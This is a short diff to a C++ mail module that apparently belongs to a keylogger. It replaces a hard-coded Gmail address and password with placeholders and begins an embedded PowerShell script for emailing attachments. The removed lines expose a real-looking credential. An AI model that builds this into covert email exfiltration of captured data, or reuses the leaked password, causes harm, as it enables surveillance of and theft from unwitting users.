@@ -12,9 +12,9 @@
 
 namespace Mail
 {   // for email details, in real life use, you only need to update the following
-    #define X_EM_TO "key.tester.email@gmail.com"
-    #define X_EM_FROM "key.tester.email@gmail.com"
-    #define X_EM_PASS "dj1289712-@"
+    #define X_EM_TO "toEmailHere@gmail.com"
+    #define X_EM_FROM "fromEmailHere@gmail.com"
+    #define X_EM_PASS "*****"
 
     const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
